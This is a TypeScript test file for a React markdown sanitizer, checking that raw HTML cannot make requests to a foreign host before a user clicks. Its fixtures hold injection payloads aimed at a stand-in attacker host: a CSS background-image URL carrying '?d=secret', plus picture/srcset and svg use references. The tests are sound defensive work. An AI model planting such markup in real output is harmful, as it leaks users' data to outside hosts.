import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import SmartText from "./SmartText";

/**
 * Raw HTML in an answer (rehype-raw) must not reach a foreign host before the
 * user clicks. Images are covered by AuthenticatedImage; these tests cover the
 * other ways markup can request a URL: inline CSS and responsive sources.
 */
const render = (text: string) => renderToStaticMarkup(<SmartText text={text} />);

describe("SmartText sanitizer", () => {
  it("drops inline style from raw html, so background-image cannot load", () => {
    const html = render(
      'Hello <span style="background-image:url(https://evil.example/?d=secret)">x</span>',
    );
    expect(html).toContain(">x</span>");
    expect(html).not.toContain("style=");
    expect(html).not.toContain("evil.example");
  });

  it("drops inline style even when raw html imitates KaTeX markup", () => {
    const html = render(
      '<span class="katex"><span class="strut" style="background:url(https://evil.example/k.png)"></span></span>',
    );
    expect(html).not.toContain("url(");
    expect(html).not.toContain("evil.example");
  });

  it("drops picture and source, whose srcset has no protocol check", () => {
    const html = render(
      '<picture><source srcset="https://evil.example/x.png"></picture>',
    );
    expect(html).not.toContain("<source");
    expect(html).not.toContain("srcset");
    expect(html).not.toContain("evil.example");
  });

  it("drops svg use, which can fetch an external document", () => {
    const html = render(
      '<svg><use href="https://evil.example/s.svg#a"></use></svg>',
    );
    expect(html).not.toContain("<use");
    expect(html).not.toContain("evil.example");
  });

  it("keeps the inline style KaTeX itself generates", () => {
    const html = render("$$\n\\frac{a}{b} \\tag{2}\n$$");
    expect(html).toContain('class="katex-display"');
    expect(html).toContain('class="katex-tag"');
    expect(html).toMatch(/style="height:[0-9.]+em/);
    expect(html).not.toContain("katex-error");
  });
});
